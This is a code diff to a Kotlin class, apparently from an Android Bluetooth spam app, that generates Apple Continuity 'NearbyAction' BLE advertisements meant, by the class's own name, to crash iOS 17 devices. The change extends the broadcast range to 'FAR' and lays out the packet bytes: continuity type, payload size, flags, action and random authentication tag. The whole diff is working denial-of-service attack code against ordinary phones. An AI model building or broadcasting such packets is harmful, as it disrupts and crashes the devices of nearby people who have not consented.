@@ -54,7 +54,7 @@ class ContinuityIos17CrashAdvertisementSetGenerator: IAdvertisementSetGenerator 
             var advertisementSet: AdvertisementSet = AdvertisementSet()
             advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
             advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_IOS_17_CRASH
-            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_UNKNOWN
+            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_FAR
 
             // Advertise Settings
             advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
@@ -79,13 +79,16 @@ class ContinuityIos17CrashAdvertisementSetGenerator: IAdvertisementSetGenerator 
             // EXAMPLE: 0x10FF4C000F05C0-0B-6473A6-000010-906584-00000000000000...
 
             //
-            // 0x10FF4C000F05 = STATIC ( HEADER )
+            // 0x10FF4C00 (Generated Automatically by Android SDK)
+            // 0F Continuity Type
+            // 05 = Payload Size
             // C0 = flags
             // 0B = action -> 0B = HomePod Setup
             // 6473A6 = authentication tag -> random data
             // appendix
 
-            var headerData = "0F05"
+            var continuityType = "0F" // 0x0F = NearbyAction
+            var payloadSize = "05"
             var flag = "C0"
             var action = nearbyAction.key
             var authenticationTag:ByteArray = Random.Default.nextBytes(3)
@@ -93,7 +96,7 @@ class ContinuityIos17CrashAdvertisementSetGenerator: IAdvertisementSetGenerator 
             var randomAppendix = Random.Default.nextBytes(3)
 
 
-            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(headerData + flag + action)
+            manufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex(continuityType + payloadSize + flag + action)
                 .plus(authenticationTag)
                 .plus(StringHelpers.decodeHex(appendix))
                 .plus(randomAppendix)
